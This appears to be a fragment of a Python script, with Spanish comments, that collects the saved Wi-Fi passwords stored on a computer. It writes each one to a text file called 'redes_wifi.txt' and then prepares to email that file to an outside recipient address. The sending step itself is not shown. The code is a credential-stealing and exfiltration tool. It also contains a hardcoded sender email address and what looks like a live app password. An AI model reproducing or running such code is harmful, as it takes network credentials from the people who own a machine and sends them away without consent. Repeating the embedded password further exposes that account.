...
for name in tqdm(network_names, desc='Obteniendo contraseñas'):
    try:
        ...
        with open('redes_wifi.txt', 'a') as file:
            file.write(f"\nContraseñas de Red para '{name}':\n")
            file.write(output_key)
    except subprocess.CalledProcessError:
        # Manejar el caso donde no se puede obtener la información de la red
        with open('redes_wifi.txt', 'a') as file:
            file.write(f"\nNo se pudo obtener la contraseña de Red para '{name}'\n")

# Enviar el archivo por correo electrónico
email_address = 'jarevaloagu@gmail.com'  # Cambia esto a tu dirección de correo
password = 'rmxygypkaurxlxxd'  # Cambia esto a tu contraseña
recipient_email = 'estefanotorres31@gmail.com'  # Cambia esto al correo del destinatario
